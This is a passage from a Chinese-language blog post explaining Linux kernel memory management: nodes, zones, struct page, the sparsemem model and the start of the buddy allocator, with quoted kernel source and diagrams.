*node_data[MAX_NUMNODES] __read_mostly;EXPORT_SYMBOL(node_data);</code></pre><p>其中包含我们的所有<code>node</code>,下面来一个好图，为啥大伙画图都这么专业捏<br><img src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fbada192ef28224f4a21a4dd90.jpg"></p><p>当我们知晓了<code>node</code>节点的存储方式，我们需要另一个数组<code>node_status</code>来描述对应<code>node</code>节点的状态，他定义在<code>/mm/page_alloc.c</code>当中，也是一个全局数组（我是真佩服写Linux的这一群大佬，这文件的分布情况跟我自己写的那个操作系统相比简直天壤之别阿）</p><pre><code class="hljs">/* * Array of node states. */nodemask_t node_states[NR_NODE_STATES] __read_mostly = &#123;    [N_POSSIBLE] = NODE_MASK_ALL,    [N_ONLINE] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifndef CONFIG_NUMA    [N_NORMAL_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifdef CONFIG_HIGHMEM    [N_HIGH_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif    [N_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,    [N_CPU] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif/* NUMA */&#125;;EXPORT_SYMBOL(node_states);</code></pre><p>而我们的<code>node_states</code>类型保存在<code>/include/linux/nodemask.h</code>,这里仍然直接引用<code>arttnba3</code>师傅</p><pre><code class="hljs">/* * 位掩码将为所有节点保存 */enum node_states &#123;    N_POSSIBLE,        /* 节点在某个时刻是联机的 */    N_ONLINE,        /* 节点是联机的 */    N_NORMAL_MEMORY,    /* 节点有着普通的内存 */#ifdef CONFIG_HIGHMEM    N_HIGH_MEMORY,        /* 节点有着普通或高端内存 */#else    N_HIGH_MEMORY = N_NORMAL_MEMORY,#endif    N_MEMORY,        /* 节点有着内存(普通，高端，可移动) */    N_CPU,        /* 节点有着一个或多个 cpu */    N_GENERIC_INITIATOR,    /* 节点有一个或多个 Generic Initiators */    NR_NODE_STATES&#125;;</code></pre><p>说完node，我来绘个图吧，这里老抄作业好像体现不出自己真正学到了东西<br><img src="http://imgsrc.baidu.com/forum/pic/item/4d086e061d950a7b0985aa0d4fd162d9f3d3c943.jpg"></p><p>我们将在之后一步一步慢慢完善这个图片</p><h3 id="zone区域"><a href="#zone区域" class="headerlink" title="zone区域"></a>zone区域</h3><p>同样的，先说其数据结构<code>struct zone</code>，他位于<code>/include/linux/mmzone.h</code></p><pre><code class="hljs">struct zone &#123;    /* Read-mostly fields */    /* zone watermarks, access with *_wmark_pages(zone) macros */    unsigned long _watermark[NR_WMARK];    unsigned long watermark_boost;    unsigned long nr_reserved_highatomic;    /*     * We don&#39;t know if the memory that we&#39;re going to allocate will be     * freeable or/and it will be released eventually, so to avoid totally     * wasting several GB of ram we must reserve some of the lower zone     * memory (otherwise we risk to run OOM on the lower zones despite     * there being tons of freeable ram on the higher zones).  This array is     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl     * changes.     */    long lowmem_reserve[MAX_NR_ZONES];#ifdef CONFIG_NUMA    int node;#endif    struct pglist_data*zone_pgdat;    struct per_cpu_pageset __percpu *pageset;    /*     * the high and batch values are copied to individual pagesets for     * faster access     */    int pageset_high;    int pageset_batch;#ifndef CONFIG_SPARSEMEM    /*     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.     * In SPARSEMEM, this map is stored in struct mem_section     */    unsigned long*pageblock_flags;#endif /* CONFIG_SPARSEMEM */    /* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */    unsigned longzone_start_pfn;    /*     * spanned_pages is the total pages spanned by the zone, including     * holes, which is calculated as:     * spanned_pages = zone_end_pfn - zone_start_pfn;     *     * present_pages is physical pages existing within the zone, which     * is calculated as:     *present_pages = spanned_pages - absent_pages(pages in holes);     *     * managed_pages is present pages managed by the buddy system, which     * is calculated as (reserved_pages includes pages allocated by the     * bootmem allocator):     *managed_pages = present_pages - reserved_pages;     *     * So present_pages may be used by memory hotplug or memory power     * management logic to figure out unmanaged pages by checking     * (present_pages - managed_pages). And managed_pages should be used     * by page allocator and vm scanner to calculate all kinds of watermarks     * and thresholds.     *     * Locking rules:     *     * zone_start_pfn and spanned_pages are protected by span_seqlock.     * It is a seqlock because it has to be read outside of zone-&gt;lock,     * and it is done in the main allocator path.  But, it is written     * quite infrequently.     *     * The span_seq lock is declared along with zone-&gt;lock because it is     * frequently read in proximity to zone-&gt;lock.  It&#39;s good to     * give them a chance of being in the same cacheline.     *     * Write access to present_pages at runtime should be protected by     * mem_hotplug_begin/end(). Any reader who can&#39;t tolerant drift of     * present_pages should get_online_mems() to get a stable value.     */    atomic_long_tmanaged_pages;    unsigned longspanned_pages;    unsigned longpresent_pages;    const char*name;#ifdef CONFIG_MEMORY_ISOLATION    /*     * Number of isolated pageblock. It is used to solve incorrect     * freepage counting problem due to racy retrieving migratetype     * of pageblock. Protected by zone-&gt;lock.     */    unsigned longnr_isolate_pageblock;#endif#ifdef CONFIG_MEMORY_HOTPLUG    /* see spanned/present_pages for more description */    seqlock_tspan_seqlock;#endif    int initialized;    /* Write-intensive fields used from the page allocator */    ZONE_PADDING(_pad1_)    /* free areas of different sizes */    struct free_areafree_area[MAX_ORDER];    /* zone flags, see below */    unsigned longflags;    /* Primarily protects free_area */    spinlock_tlock;    /* Write-intensive fields used by compaction and vmstats. */    ZONE_PADDING(_pad2_)    /*     * When free pages are below this point, additional steps are taken     * when reading the number of free pages to avoid per-cpu counter     * drift allowing watermarks to be breached     */    unsigned long percpu_drift_mark;#if defined CONFIG_COMPACTION || defined CONFIG_CMA    /* pfn where compaction free scanner should start */    unsigned longcompact_cached_free_pfn;    /* pfn where compaction migration scanner should start */    unsigned longcompact_cached_migrate_pfn[ASYNC_AND_SYNC];    unsigned longcompact_init_migrate_pfn;    unsigned longcompact_init_free_pfn;#endif#ifdef CONFIG_COMPACTION    /*     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions     * are skipped before trying again. The number attempted since     * last failure is tracked with compact_considered.     * compact_order_failed is the minimum compaction failed order.     */    unsigned intcompact_considered;    unsigned intcompact_defer_shift;    intcompact_order_failed;#endif#if defined CONFIG_COMPACTION || defined CONFIG_CMA    /* Set to true when the PG_migrate_skip bits should be cleared */    boolcompact_blockskip_flush;#endif    boolcontiguous;    ZONE_PADDING(_pad3_)    /* Zone statistics */    atomic_long_tvm_stat[NR_VM_ZONE_STAT_ITEMS];    atomic_long_tvm_numa_stat[NR_VM_NUMA_STAT_ITEMS];&#125; ____cacheline_internodealigned_in_smp;</code></pre><p>同样地，我们来了解其中比较重要的字段</p><ul><li><strong>_watermark</strong> 水位线，一般表示剩余空闲页框，他又三个挡位，分别是<code>WMARK_MIN</code>,<code>WMARK_LOW</code>,<code>WMARK_HIGH</code>，他存放在<code>_watermark</code>数组当中，进行内存分配的时候，分配器会根据当前水位来采取不同的措施，下面搞个图：</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/38dbb6fd5266d016ce8f7ae1d22bd40734fa3561.jpg"></p><ul><li><p><strong>lowmem_reserve</strong>:当本<code>zone</code>没有空闲块之后，会到别的<code>zone</code>中进行分配，避免分配内存全分配在低端<code>zone</code>，而我们不能保证这里分配的内存是可释放，或者最终会被释放的，出现低端<code>zone</code>区域内存提前耗尽，而高端<code>zone</code>区保留大量内存，因此声名该字段来保留一段内存，而这里的<code>zone</code>区内存是其他<code>zone</code>不能打扰的</p></li><li><p><strong>node</strong>:标识该<code>zone</code>所属<code>node</code>，当然，这里只在<code>NUMA</code>启动，<code>UMA</code>中只有一个<code>node</code>，不需要这个字段</p></li><li><p><strong>zone_pgdat</strong>:标识所属的<code>pglist_data</code>节点，同上面的<code>node</code></p></li><li><p><strong>pageset</strong>：由于目前都是多处理器CPU架构，因此对于临界区的同步互斥访问就是一个严重的问题，而防止出错的办法之一加锁解锁十分浪费资源，因此每个<code>zone</code>当中都为每一个CPU准备一个单独的页面仓库，最开始<code>buddy system</code>会首先将页面放置在各个CPU独自的页面仓库当中，需要进行分配的时候优先从其中分配，其类型结构体位于<code>/include/linux/mmzone.h</code></p><pre><code class="hljs">  struct per_cpu_pages &#123;      int count;/* number of pages in the list */      int high;/* high watermark, emptying needed */      int batch;/* chunk size for buddy add/remove */        /* Lists of pages, one per migrate type stored on the pcp-lists */      struct list_head lists[MIGRATE_PCPTYPES]; //双链表指针数组，指向空闲页们  &#125;;  struct per_cpu_pageset &#123;      struct per_cpu_pages pcp;  #ifdef CONFIG_NUMA      s8 expire;      u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];  #endif  #ifdef CONFIG_SMP      s8 stat_threshold;      s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];  #endif  &#125;;</code></pre><p>  此结构是一个包括状态，他会被存放在每个CPU独立的<code>.data..percpu</code>段当中，下面再再再次引用<code>arttnba3</code>师傅的图，真的态🐂辣</p></li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/902397dda144ad340c83614e95a20cf431ad853f.jpg"></p><ul><li><p><strong>zone_start_pfn</strong>：该<code>zone</code>的起始物理地址编号pfn(page frame number)</p></li><li><p><strong>spanned_pages</strong>：本<code>zone</code>区域中内存的<code>page</code>总数</p></li><li><p><strong>present_pages</strong>：本<code>zone</code>中实际存在的物理页框数</p></li><li><p><strong>managed_pages</strong>：本<code>zone</code>中<code>buddy system</code>管理的页面数量</p></li><li><p><strong>free_area</strong>：<code>buddy_system</code>按照<code>order</code>管理的页面，为一个<code>free_area</code>结构体数组，具体定义如下：</p><pre><code class="hljs">  struct free_area &#123;      struct list_head    free_list[MIGRATE_TYPES];      unsigned long        nr_free;  &#125;;</code></pre></li></ul><p>看图好吧,这个<code>order</code>起始就是伙伴系统中的对于不同大小页分配的请求大小</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec9b54b0de27d0f703908fc185.jpg"></p><ul><li><p><strong>flags</strong>：标识<code>zone</code>的状态</p></li><li><p><strong>vm_stat</strong>：统计数据，这里是一个数组，而数组大小取决于定义的枚举类型，如下：</p><pre><code class="hljs">  enum zone_stat_item &#123;      /* First 128 byte cacheline (assuming 64 bit words) */      NR_FREE_PAGES,      NR_ZONE_LRU_BASE, /* Used only for compaction and reclaim retry */      NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,      NR_ZONE_ACTIVE_ANON,      NR_ZONE_INACTIVE_FILE,      NR_ZONE_ACTIVE_FILE,      NR_ZONE_UNEVICTABLE,      NR_ZONE_WRITE_PENDING,/* Count of dirty, writeback and unstable pages */      NR_MLOCK,/* mlock()ed pages found and moved off LRU */      /* Second 128 byte cacheline */      NR_BOUNCE,  #if IS_ENABLED(CONFIG_ZSMALLOC)      NR_ZSPAGES,/* allocated in zsmalloc */  #endif      NR_FREE_CMA_PAGES,      NR_VM_ZONE_STAT_ITEMS &#125;;</code></pre></li></ul><p>讲完一般结构，这里需要注意，虽说我们的<code>node</code>节点中直接就是一个<code>zone</code>数组，但他们之间是有区别的，此在<code>/include/linux/mmzone.h</code>中有定义：</p><pre><code class="hljs">enum zone_type &#123;    /*     * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able     * to DMA to all of the addressable memory (ZONE_NORMAL).     * On architectures where this area covers the whole 32 bit address     * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller     * DMA addressing constraints. This distinction is important as a 32bit     * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit     * platforms may need both zones as they support peripherals with     * different DMA addressing limitations.     */#ifdef CONFIG_ZONE_DMA    ZONE_DMA,#endif#ifdef CONFIG_ZONE_DMA32    ZONE_DMA32,#endif    /*     * Normal addressable memory is in ZONE_NORMAL. DMA operations can be     * performed on pages in ZONE_NORMAL if the DMA devices support     * transfers to all addressable memory.     */    ZONE_NORMAL,#ifdef CONFIG_HIGHMEM    /*     * A memory area that is only addressable by the kernel through     * mapping portions into its own address space. This is for example     * used by i386 to allow the kernel to address the memory beyond     * 900MB. The kernel will set up special mappings (page     * table entries on i386) for each page that the kernel needs to     * access.     */    ZONE_HIGHMEM,#endif    /*     * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains     * movable pages with few exceptional cases described below. Main use     * cases for ZONE_MOVABLE are to make memory offlining/unplug more     * likely to succeed, and to locally limit unmovable allocations - e.g.,     * to increase the number of THP/huge pages. Notable special cases are:     *     * 1. Pinned pages: (long-term) pinning of movable pages might     *    essentially turn such pages unmovable. Memory offlining might     *    retry a long time.     * 2. memblock allocations: kernelcore/movablecore setups might create     *    situations where ZONE_MOVABLE contains unmovable allocations     *    after boot. Memory offlining and allocations fail early.     * 3. Memory holes: kernelcore/movablecore setups might create very rare     *    situations where ZONE_MOVABLE contains memory holes after boot,     *    for example, if we have sections that are only partially     *    populated. Memory offlining and allocations fail early.     * 4. PG_hwpoison pages: while poisoned pages can be skipped during     *    memory offlining, such pages cannot be allocated.     * 5. Unmovable PG_offline pages: in paravirtualized environments,     *    hotplugged memory blocks might only partially be managed by the     *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The     *    parts not manged by the buddy are unmovable PG_offline pages. In     *    some cases (virtio-mem), such pages can be skipped during     *    memory offlining, however, cannot be moved/allocated. These     *    techniques might use alloc_contig_range() to hide previously     *    exposed pages from the buddy again (e.g., to implement some sort     *    of memory unplug in virtio-mem).     *     * In general, no unmovable allocations that degrade memory offlining     * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())     * have to expect that migrating pages in ZONE_MOVABLE can fail (even     * if has_unmovable_pages() states that there are no unmovable pages,     * there can be false negatives).     */    ZONE_MOVABLE,#ifdef CONFIG_ZONE_DEVICE    ZONE_DEVICE,#endif    __MAX_NR_ZONES&#125;;</code></pre><p>这里x86分别32位与64位都会有所区别，如下：<br>在32位中，<code>zone</code>可以分为<code>ZONE_DMA</code>、<code>ZONE_NORMAL</code>、<code>ZONE_HIGHMEM</code>，他们分别对应的起始和终止地址为</p><p><code>ZONE_DMA</code>：0~16MB</p><p><code>ZONE_NORMAL</code>：16~896MB</p><p><code>ZONE_HIGHMEM</code>:896~…MB</p><p>以上前两种类型是线性映射，也就是这里是直接映射的，也就是说存在虚拟地址就是物理地址的情形，后面的高端内存是不连续的</p><p>在64位中有所区别，<code>zone</code>分为如下三种</p><p><code>ZONE_DMA</code>：0~16MB</p><p><code>ZONE_DMA32</code>：16~4GB</p><p><code>ZONE_NORMAL</code>:4GB~…</p><p>内核中取消了高端内存的概念，接着上面咱们画的图，这里我们把<code>zone</code>补上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13cef9dada9854564e93584b63.jpg"></p><h3 id="page页框"><a href="#page页框" class="headerlink" title="page页框"></a>page页框</h3><p>终于来到了咱们的页框，这里的<code>page</code>对应的是物理页框而不是虚拟页，注意漏。<br>他对应的数据结构是<code>struct page</code>，位于<code>/include/linux/mm_types.h</code>如下：</p><pre><code class="hljs">struct page &#123;    unsigned long flags;/* Atomic flags, some possibly                     * updated asynchronously */    /*     * Five words (20/40 bytes) are available in this union.     * WARNING: bit 0 of the first word is used for PageTail(). That     * means the other users of this union MUST NOT use the bit to     * avoid collision and false-positive PageTail().     */    union &#123;        struct &#123;/* Page cache and anonymous pages */            /**             * @lru: Pageout list, eg. active_list protected by             * lruvec-&gt;lru_lock.  Sometimes used as a generic list             * by the page owner.             */            struct list_head lru;            /* See page-flags.h for PAGE_MAPPING_FLAGS */            struct address_space *mapping;            pgoff_t index;/* Our offset within mapping. */            /**             * @private: Mapping-private opaque data.             * Usually used for buffer_heads if PagePrivate.             * Used for swp_entry_t if PageSwapCache.             * Indicates order in the buddy system if PageBuddy.             */            unsigned long private;        &#125;;        struct &#123;/* page_pool used by netstack */            /**             * @dma_addr: might require a 64-bit value on             * 32-bit architectures.             */            unsigned long dma_addr[2];        &#125;;        struct &#123;/* slab, slob and slub */            union &#123;                struct list_head slab_list;                struct &#123;/* Partial pages */                    struct page *next;#ifdef CONFIG_64BIT                    int pages;/* Nr of pages left */                    int pobjects;/* Approximate count */#else                    short int pages;                    short int pobjects;#endif                &#125;;            &#125;;            struct kmem_cache *slab_cache; /* not slob */            /* Double-word boundary */            void *freelist;/* first free object */            union &#123;                void *s_mem;/* slab: first object */                unsigned long counters;/* SLUB */                struct &#123;/* SLUB */                    unsigned inuse:16;                    unsigned objects:15;                    unsigned frozen:1;                &#125;;            &#125;;        &#125;;        struct &#123;/* Tail pages of compound page */            unsigned long compound_head;/* Bit zero is set */            /* First tail page only */            unsigned char compound_dtor;            unsigned char compound_order;            atomic_t compound_mapcount;            unsigned int compound_nr; /* 1 &lt;&lt; compound_order */        &#125;;        struct &#123;/* Second tail page of compound page */            unsigned long _compound_pad_1;/* compound_head */            atomic_t hpage_pinned_refcount;            /* For both global and memcg */            struct list_head deferred_list;        &#125;;        struct &#123;/* Page table pages */            unsigned long _pt_pad_1;/* compound_head */            pgtable_t pmd_huge_pte; /* protected by page-&gt;ptl */            unsigned long _pt_pad_2;/* mapping */            union &#123;                struct mm_struct *pt_mm; /* x86 pgds only */                atomic_t pt_frag_refcount; /* powerpc */            &#125;;#if ALLOC_SPLIT_PTLOCKS            spinlock_t *ptl;#else            spinlock_t ptl;#endif        &#125;;        struct &#123;/* ZONE_DEVICE pages */            /** @pgmap: Points to the hosting device page map. */            struct dev_pagemap *pgmap;            void *zone_device_data;            /*             * ZONE_DEVICE private pages are counted as being             * mapped so the next 3 words hold the mapping, index,             * and private fields from the source anonymous or             * page cache page while the page is migrated to device             * private memory.             * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also             * use the mapping, index, and private fields when             * pmem backed DAX files are mapped.             */        &#125;;        /** @rcu_head: You can use this to free a page by RCU. */        struct rcu_head rcu_head;    &#125;;    union &#123;/* This union is 4 bytes in size. */        /*         * If the page can be mapped to userspace, encodes the number         * of times this page is referenced by a page table.         */        atomic_t _mapcount;        /*         * If the page is neither PageSlab nor mappable to userspace,         * the value stored here may help determine what this page         * is used for.  See page-flags.h for a list of page types         * which are currently stored here.         */        unsigned int page_type;        unsigned int active;/* SLAB */        int units;/* SLOB */    &#125;;    /* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */    atomic_t _refcount;#ifdef CONFIG_MEMCG    unsigned long memcg_data;#endif    /*     * On machines where all RAM is mapped into kernel address space,     * we can simply calculate the virtual address. On machines with     * highmem some memory is mapped into kernel virtual memory     * dynamically, so we need a place to store that address.     * Note that this field could be 16 bits on x86 ... ;)     *     * Architectures with slow multiplication can define     * WANT_PAGE_VIRTUAL in asm/page.h     */#if defined(WANT_PAGE_VIRTUAL)    void *virtual;/* Kernel virtual address (NULL if                       not kmapped, ie. highmem) */#endif /* WANT_PAGE_VIRTUAL */#ifdef LAST_CPUPID_NOT_IN_PAGE_FLAGS    int _last_cpupid;#endif&#125; _struct_page_alignment;</code></pre><p>老样子，先解释关键字段</p><ul><li><p><strong>lru</strong>：最近未使用页这个概念在计算机组成原理或者说操作系统课程里面都会讲解，这里也就不过多描述，在linux内核当中，page通过该字段来组织成链表</p></li><li><p><strong>slab相关</strong>：用来存放<code>slab</code>相关成员</p><pre><code class="hljs">  struct &#123;    /* slab, slob and slub */              union &#123;                  struct list_head slab_list;                  struct &#123;    /* Partial pages */                      struct page *next;  #ifdef CONFIG_64BIT                      int pages;  /* Nr of pages left */                      int pobjects;   /* Approximate count */  #else                      short int pages;                         short int pobjects;  #endif                  &#125;;              &#125;;              struct kmem_cache *slab_cache; /* not slob */              /* Double-word boundary */              void *freelist;     /* first free object */              union &#123;                  void *s_mem;    /* slab: first object */                  unsigned long counters;     /* SLUB */                  struct &#123;            /* SLUB */                      unsigned inuse:16;                      unsigned objects:15;                      unsigned frozen:1;                  &#125;;              &#125;;          &#125;;</code></pre></li></ul><p>下面给出又一张十分详细的图，是由简·李奥师傅所作</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4ec2d5628535e5dd881a441633c6a7efcf1b62c1.jpg"></p><ul><li><p><strong>flags</strong>：表示该页所处在的状态，定义于<code>include/linux/page-flags.h</code>当中，他是一个枚举类型，如下：</p><pre><code class="hljs">  enum pageflags &#123;      PG_locked,        /* Page is locked. Don&#39;t touch. */      PG_referenced,      PG_uptodate,      PG_dirty,      PG_lru,      PG_active,      PG_workingset,      PG_waiters,        /* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */      PG_error,      PG_slab,      PG_owner_priv_1,    /* Owner use. If pagecache, fs may use*/      PG_arch_1,      PG_reserved,      PG_private,        /* If pagecache, has fs-private data */      PG_private_2,        /* If pagecache, has fs aux data */      PG_writeback,        /* Page is under writeback */      PG_head,        /* A head page */      PG_mappedtodisk,    /* Has blocks allocated on-disk */      PG_reclaim,        /* To be reclaimed asap */      PG_swapbacked,        /* Page is backed by RAM/swap */      PG_unevictable,        /* Page is &quot;unevictable&quot;  */  #ifdef CONFIG_MMU      PG_mlocked,        /* Page is vma mlocked */  #endif  #ifdef CONFIG_ARCH_USES_PG_UNCACHED      PG_uncached,        /* Page has been mapped as uncached */  #endif  #ifdef CONFIG_MEMORY_FAILURE      PG_hwpoison,        /* hardware poisoned page. Don&#39;t touch */  #endif  #if defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)      PG_young,      PG_idle,  #endif  #ifdef CONFIG_64BIT      PG_arch_2,  #endif      __NR_PAGEFLAGS,        /* Filesystems */      PG_checked = PG_owner_priv_1,        /* SwapBacked */      PG_swapcache = PG_owner_priv_1,    /* Swap page: swp_entry_t in private */        /* Two page bits are conscripted by FS-Cache to maintain local caching       * state.  These bits are set on pages belonging to the netfs&#39;s inodes       * when those inodes are being locally cached.       */      PG_fscache = PG_private_2,    /* page backed by cache */        /* XEN */      /* Pinned in Xen as a read-only pagetable page. */      PG_pinned = PG_owner_priv_1,      /* Pinned as part of domain save (see xen_mm_pin_all()). */      PG_savepinned = PG_dirty,      /* Has a grant mapping of another (foreign) domain&#39;s page. */      PG_foreign = PG_owner_priv_1,      /* Remapped by swiotlb-xen. */      PG_xen_remapped = PG_owner_priv_1,        /* SLOB */      PG_slob_free = PG_private,        /* Compound pages. Stored in first tail page&#39;s flags */      PG_double_map = PG_workingset,        /* non-lru isolated movable page */      PG_isolated = PG_reclaim,        /* Only valid for buddy pages. Used to track pages that are reported */      PG_reported = PG_uptodate,  &#125;;</code></pre><p>  这里采用的复用的手法，也就是说flags字段还容纳了其他元素，如下，结构划分位于<code>/include/linux/page-flags-layout.h</code>当中</p><pre><code class="hljs">  /*   * page-&gt;flags layout:   *   * There are five possibilities for how page-&gt;flags get laid out.  The first   * pair is for the normal case without sparsemem. The second pair is for   * sparsemem when there is plenty of space for node and section information.   * The last is when there is insufficient space in page-&gt;flags and a separate   * lookup is necessary.   *   * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |   *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |   * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |   *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |   * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |   */</code></pre></li></ul><p> 可以看到在不同布局下他其实是可以用作指向归属的<code>zone</code>和<code>node</code>的</p><ul><li><p><strong>_mapcount</strong>：记录该页被页表映射的次数，初始值为-1，他是一个根据不同情况所采用的联合结构体，如果说他是被用户空间所映射，那么他会记录被映射的次数，但若是他没被映射到用户空间，页不是<code>PageSlab</code>,那么他为page_type字段，它定义于<code>/include/linux/page-flags.h</code>字段当中，如下：</p><pre><code class="hljs">  /*   * For pages that are never mapped to userspace (and aren&#39;t PageSlab),   * page_type may be used.  Because it is initialised to -1, we invert the   * sense of the bit, so __SetPageFoo *clears* the bit used for PageFoo, and   * __ClearPageFoo *sets* the bit used for PageFoo.  We reserve a few high and   * low bits so that an underflow or overflow of page_mapcount() won&#39;t be   * mistaken for a page type value.   */    #define PAGE_TYPE_BASE    0xf0000000  /* Reserve        0x0000007f to catch underflows of page_mapcount */  #define PAGE_MAPCOUNT_RESERVE    -128  #define PG_buddy    0x00000080  #define PG_offline    0x00000100  #define PG_table    0x00000200  #define PG_guard    0x00000400</code></pre></li><li><p><strong>_refcount</strong>：用作该页在内核中的引用次数，初值为0，若大于0表示正在被使用，等于0表示空闲或将要被释放，内核函数<code>get_page()</code>和<code>put_page()</code>函数会来进行引用计数的增减，后者若引用计数器为1则会调用<code>__put_single_page()</code>释放该页面</p></li><li><p><strong>vitrual</strong>：指向物理页框对应虚拟地址（这里有点疑问那就是他被多个页表映射咋办捏，还是说每次切换进程的时候会刷新一下这里呢？）</p></li></ul><p>说完数据结构，还记得上面<code>flags</code>不同布局下对应的结构吗，linux一般提供了三种内存模型，定义在<code>/include/asm-generic/memory_model.h</code><br><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d106098edf8643fb80e7aec90af.jpg"></p><p>常用模型是<code>sparsemem</code>,所以我们只了解他，中文翻译过来就是离散内存模型。在这个模型下，内存中会存在一个<code>mem_section</code>类型的指针数组，而其中元素指向的<code>mem_section</code>结构体中的<code>section_mem_map</code>成员会指向一个<code>struct page</code>类型的数组，它对应于一个连续的物理地址空间，如下图所示</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/962bd40735fae6cdb11e4aa84ab30f2443a70f55.jpg"></p><p>其中<code>mem_section</code>结构体的定义在<code>/include/linux/mmzone.h</code>当中，如下：</p><pre><code class="hljs">struct mem_section &#123;    /*     * This is, logically, a pointer to an array of struct     * pages.  However, it is stored with some other magic.     * (see sparse.c::sparse_init_one_section())     *     * Additionally during early boot we encode node id of     * the location of the section here to guide allocation.     * (see sparse.c::memory_present())     *     * Making it a UL at least makes someone do a cast     * before using it wrong.     */    unsigned long section_mem_map;    struct mem_section_usage *usage;#ifdef CONFIG_PAGE_EXTENSION    /*     * If SPARSEMEM, pgdat doesn&#39;t have page_ext pointer. We use     * section. (see page_ext.h about this.)     */    struct page_ext *page_ext;    unsigned long pad;#endif    /*     * WARNING: mem_section must be a power-of-2 in size for the     * calculation and use of SECTION_ROOT_MASK to make sense.     */&#125;;</code></pre><p>而我们的全局<code>mem_section</code>数组存放着指向所有<code>struct mem_section</code>结构体的指针，定义于<code>/mm/sparse.c</code>当中：</p><pre><code class="hljs">#ifdef CONFIG_SPARSEMEM_EXTREMEstruct mem_section **mem_section;#elsestruct mem_section mem_section[NR_SECTION_ROOTS][SECTIONS_PER_ROOT]    ____cacheline_internodealigned_in_smp;#endif</code></pre><p>咱们之前说到的数据结构都会使用<code>PFN</code>进行表示物理地址，但实际上他并不是物理地址，而是对应的某一个<code>page</code>的，而<code>pfn</code>的含义就是<code>page frame number</code>，他为每个物理页框所在位置都编了个号。而我们要通过<code>PFN</code>找到<code>page</code>或通过<code>page</code>找到<code>PFN</code>都需要这个<code>mem_section</code>结构体中的<code>section_mem_map</code>来实现。</p><h2 id="2-伙伴系统"><a href="#2-伙伴系统" class="headerlink" title="2.伙伴系统"></a>2.伙伴系统</h2><p>我们刚刚已经知道了，每个<code>zone</code>中包含一个<code>free_area</code>数组，其中就是一个个的双链表，且按照了<code>buddy system</code>的<code>order</code>进行管理，<br><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec9b54b0de27d0f703908fc185.jpg"></p><p>而我们一个<code>free_area</code>中其实并不只有一个双向链表，他是按照不同的<code>migrate type</code>也就是迁移类型进行存放，主要是为了避免内存过于碎片化，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/cb8065380cd79123d89a77bde8345982b3b78085.jpg"></p><p>而这里的页面存在一个迁移类型，这决定了该页是否可以迁移，如下：</p><pre><code class="hljs">enum migratetype &#123;    MIGRATE_UNMOVABLE, //不可移动    MIGRATE_MOVABLE, //不可移动    MIGRATE_RECLAIMABLE, //不能直接移动，但可以删除，例如文件映射页    MIGRATE_PCPTYPES,/* the number of types on the pcp lists */ //仅限同一节点内移动    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,#ifdef CONFIG_CMA    /*     * MIGRATE_CMA migration type is designed to mimic the way     * ZONE_MOVABLE works.  Only movable pages can be allocated     * from MIGRATE_CMA pageblocks and page allocator never     * implicitly change migration type of MIGRATE_CMA pageblock.     *     * The way to use it is to change migratetype of a range of     * pageblocks to MIGRATE_CMA which can be done by     * __free_pageblock_cma() function.  What is important though     * is that a range of pageblocks must be aligned to     * MAX_ORDER_NR_PAGES should biggest page be bigger then     * a single pageblock.     */    MIGRATE_CMA, //连续的物理内存#endif#ifdef CONFIG_MEMORY_ISOLATION    MIGRATE_ISOLATE,/* can&#39;t allocate from here */#endif    MIGRATE_TYPES&#125;;</code></pre><p>下面仍然是一个<code>arttnba3</code>师傅所做的图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9d368d7107c01213fb90e91b6.jpg"></p><p>而<code>free_area</code>中的结构中的<code>nr_free</code>表示的是当前<code>free_area</code>中空闲页面块的数量</p><pre><code class="hljs">struct free_area &#123;    struct list_headfree_list[MIGRATE_TYPES];    unsigned longnr_free;&#125;;</code></pre><h3 id="1-分配页框"><a href="#1-分配页框" class="headerlink" title="1. 分配页框"></a>1. 分配页框</h3><p>内核中实现了几个函数接口来请求页框，最终都会调用<code>__alloc_pages_nodemask</code>，如下图</p><p><img 